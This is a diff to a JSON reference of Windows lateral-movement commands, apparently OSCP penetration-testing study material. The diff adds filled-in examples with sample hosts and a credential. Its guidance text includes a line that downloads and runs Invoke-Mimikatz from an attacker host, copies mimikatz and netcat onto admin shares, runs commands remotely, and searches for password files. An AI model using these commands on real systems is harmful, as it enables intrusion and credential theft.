@@ -59,7 +59,8 @@
       "oscp_relevance": "high",
       "methodology_guidance": {
         "after_success": "Enumerate system: whoami, hostname, systeminfo Search for credentials: dir C:\\Users\\*\\Desktop\\*.txt, findstr /SI password *.txt *.config Upload tools: Copy-Item -FromSession $session or via shares Exit session: Exit-PSSession"
-      }
+      },
+      "filled_example": "Enter-PSSession -ComputerName FILESERVER01.corp.com"
     },
     {
       "id": "invoke-command",
@@ -120,7 +121,8 @@
       "oscp_relevance": "high",
       "methodology_guidance": {
         "after_success": "Run enumeration: Invoke-Command -ComputerName <TARGET> -ScriptBlock { Get-NetUser } Execute Mimikatz: Invoke-Command -ComputerName <TARGET> -ScriptBlock { IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/Invoke-Mimikatz.ps1'); Invoke-Mimikatz } Multi-host execution: Invoke-Command -ComputerName (Get-Content targets.txt) -ScriptBlock {...}"
-      }
+      },
+      "filled_example": "Invoke-Command -ComputerName WS01.corp.com,WS02.corp.com -ScriptBlock { whoami; hostname; ipconfig }"
     },
     {
       "id": "test-wsman-connectivity",
@@ -178,7 +180,8 @@
       "methodology_guidance": {
         "after_success": "If success: Use Enter-PSSession or Invoke-Command for lateral movement Alternative: Try PsExec, WMI, or DCOM lateral movement methods",
         "on_failure": "If failure: Check WinRM service status, firewall rules, authentication method"
-      }
+      },
+      "filled_example": "Test-WSMan -ComputerName WS01.corp.com"
     },
     {
       "id": "enable-psremoting",
@@ -275,7 +278,8 @@
       "oscp_relevance": "high",
       "methodology_guidance": {
         "after_success": "If True: Use lateral movement (PsExec, WinRM, WMI, DCOM) List admin shares: net view \\\\<TARGET> Browse C$: dir \\\\<TARGET>\\C$\\Users\\ Upload tools: copy C:\\Tools\\mimikatz.exe \\\\<TARGET>\\C$\\Temp\\"
-      }
+      },
+      "filled_example": "Test-Path \\\\FILESERVER01.corp.com\\C$"
     },
     {
       "id": "net-use-admin-share",
@@ -356,7 +360,8 @@
       "oscp_relevance": "high",
       "methodology_guidance": {
         "after_success": "Browse share: dir \\\\<TARGET>\\C$\\Users\\ Upload files: copy C:\\Tools\\nc.exe \\\\<TARGET>\\C$\\Temp\\ Execute commands: wmic /node:<TARGET> /user:<DOMAIN>\\<USERNAME> /password:<PASSWORD> process call create \"cmd.exe /c <COMMAND>\" Disconnect: net use \\\\<TARGET>\\C$ /delete"
-      }
+      },
+      "filled_example": "net use \\\\WS01.corp.com\\C$ /user:CORP\\administrator P@ssw0rd123"
     },
     {
       "id": "dir-admin-share",
@@ -423,7 +428,8 @@
       "oscp_relevance": "high",
       "methodology_guidance": {
         "after_success": "Search for sensitive files: dir \\\\<TARGET>\\C$ /s /b | findstr /I password config backup Browse user directories: dir \\\\<TARGET>\\C$\\Users\\ Download files: copy \\\\<TARGET>\\C$\\Users\\admin\\Desktop\\passwords.txt . Check for tools: dir \\\\<TARGET>\\C$\\Temp\\"
-      }
+      },
+      "filled_example": "dir \\\\FILESERVER01\\C$"
     },
     {
       "id": "copy-file-admin-share",
@@ -490,7 +496,8 @@
       "oscp_relevance": "high",
       "methodology_guidance": {
         "after_success": "Verify upload: dir \\\\<TARGET>\\C$\\<REMOTE_PATH> Execute uploaded file: PsExec.exe \\\\<TARGET> C:\\<REMOTE_PATH> Alternative execution: wmic /node:<TARGET> process call create \"C:\\<REMOTE_PATH>\" Download files: copy \\\\<TARGET>\\C$\\<REMOTE_PATH> <LOCAL_DESTINATION>"
-      }
+      },
+      "filled_example": "copy C:\\Tools\\mimikatz.exe \\\\FILESERVER01\\C$\\Temp\\mimikatz.exe"
     }
   ]
 }
